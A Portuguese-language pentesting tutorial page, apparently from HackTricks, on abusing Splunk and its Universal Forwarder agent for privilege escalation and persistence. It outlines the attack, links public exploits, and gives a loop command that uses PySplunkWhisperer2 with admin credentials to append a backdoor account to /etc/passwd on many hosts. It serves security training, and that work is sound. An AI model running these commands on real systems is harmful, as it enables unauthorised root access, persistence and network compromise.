# Splunk LPE e Persistência

{{#include ../../banners/hacktricks-training.md}}

Se **enumerando** uma máquina **internamente** ou **externamente** você encontrar **Splunk em execução** (porta 8090), se você tiver a sorte de conhecer **credenciais válidas**, você pode **abusar do serviço Splunk** para **executar um shell** como o usuário que está executando o Splunk. Se o root estiver executando, você pode escalar privilégios para root.

Além disso, se você **já for root e o serviço Splunk não estiver ouvindo apenas no localhost**, você pode **roubar** o arquivo de **senha** **do** serviço Splunk e **quebrar** as senhas, ou **adicionar novas** credenciais a ele. E manter persistência no host.

Na primeira imagem abaixo, você pode ver como uma página web do Splunkd se parece.

## Resumo da Exploração do Agente Splunk Universal Forwarder

Para mais detalhes, consulte o post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Este é apenas um resumo:

**Visão Geral da Exploração:**
Uma exploração direcionada ao Agente Splunk Universal Forwarder (UF) permite que atacantes com a senha do agente executem código arbitrário em sistemas que executam o agente, potencialmente comprometendo toda a rede.

**Pontos Chave:**

- O agente UF não valida conexões de entrada ou a autenticidade do código, tornando-o vulnerável à execução não autorizada de código.
- Métodos comuns de aquisição de senhas incluem localizá-las em diretórios de rede, compartilhamentos de arquivos ou documentação interna.
- A exploração bem-sucedida pode levar a acesso de nível SYSTEM ou root em hosts comprometidos, exfiltração de dados e infiltração adicional na rede.

**Execução da Exploração:**

1. O atacante obtém a senha do agente UF.
2. Utiliza a API do Splunk para enviar comandos ou scripts para os agentes.
3. As ações possíveis incluem extração de arquivos, manipulação de contas de usuário e comprometimento do sistema.

**Impacto:**

- Comprometimento total da rede com permissões de nível SYSTEM/root em cada host.
- Potencial para desativar logs para evitar detecção.
- Instalação de backdoors ou ransomware.

**Exemplo de Comando para Exploração:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits públicos utilizáveis:**

- https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
- https://www.exploit-db.com/exploits/46238
- https://www.exploit-db.com/exploits/46487

## Abusando de Consultas Splunk

**Para mais detalhes, consulte o post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{{#include ../../banners/hacktricks-training.md}}
